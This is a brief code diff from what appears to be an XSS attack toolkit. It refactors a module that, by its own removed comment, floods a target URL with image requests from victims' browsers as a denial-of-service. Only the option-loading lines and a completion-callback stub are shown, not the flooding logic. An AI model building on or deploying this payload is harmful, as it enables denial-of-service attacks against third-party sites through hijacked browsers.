@@ -1,9 +1,7 @@
-<?php
-# send ddos to url by appending images to the docuument. notifies when complete
-#
-?>
-var xssurl = decodeURIComponent("<?=$url?>");
-var xssrequests = <?=(isset($requests)) ? $requests : 10?>;
+// get the options
+
+var xssurl = decodeURIComponent(xssopt("url"));
+var xssrequests = xssopt("requests");
 
 // called after the DoS finishes
 function xssdosfin() {
